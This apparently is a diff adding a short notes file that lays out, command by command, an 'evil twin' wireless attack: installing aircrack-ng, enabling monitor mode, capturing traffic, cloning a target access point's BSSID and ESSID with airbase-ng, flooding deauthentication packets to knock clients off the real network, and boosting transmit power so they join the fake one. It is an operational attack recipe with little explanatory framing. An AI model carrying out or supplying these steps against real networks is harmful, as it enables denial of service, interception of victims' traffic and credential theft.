@@ -1,0 +1,39 @@
+# http://www.kalitutorials.net/2014/07/evil-twin-tutorial.html
+
+# Note: You need a wireless card with a chipset capable of going into monitor mode
+# You need to have the aircrack-ng suite installed
+> apt-get install aircrack-ng (for Debian based distributions)
+OR 
+> yum install aircrack-ng (for CentOS / RHEL)
+OR (manual compile/install)
+> wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz
+> tar -zxvf aircrack-ng-1.2-rc2.tar.gz (decompress the tarball)
+> cd aircrack-ng-1.2-rc2 (change to the uncompressed directory)
+> make (run make to build the binaries, no need for > ./configure)
+> make install (installs (copies) the binaries into the appropriate locations on the system, no registry in linux..)
+
+# Show all wireless interfaces
+> iwconfig
+# Start monitor mode, monitor iface mon0 will show up (see output)
+> airmon-ng start wlan1
+# Capture packets from the new monitor iface
+> airodump-ng mon0
+
+# Create the twin
+> airbase-ng -a <BSSID here> --essid <ESSID here> -c <channel here> <interface name>
+
+# If you face any problems, a shorter code will be
+> airbase-ng --essid <name of network> mon0 
+
+# Force clients to disconnect from their AP, --deauth 0 sends deauth packets quickly, 1 would be every second
+> aireplay-ng --deauth 0 -a <BSSID> mon0 --ignore-negative-one
+
+Not the real one, but why the fake one
+Even after being disconnected from the real AP, the client may choose to keep trying to connect to the same AP a few more times, instead of trying to connect to ours. We need to make our AP stand out, and for that, we need more signal strength. There are 2 ways to do that-
+
+Physically move closer to the client.
+Power up your wireless card to transmit at more power. 
+The latter can be done with the following command if supported by the card
+> iwconfig wlan1 txpower 27
+
+
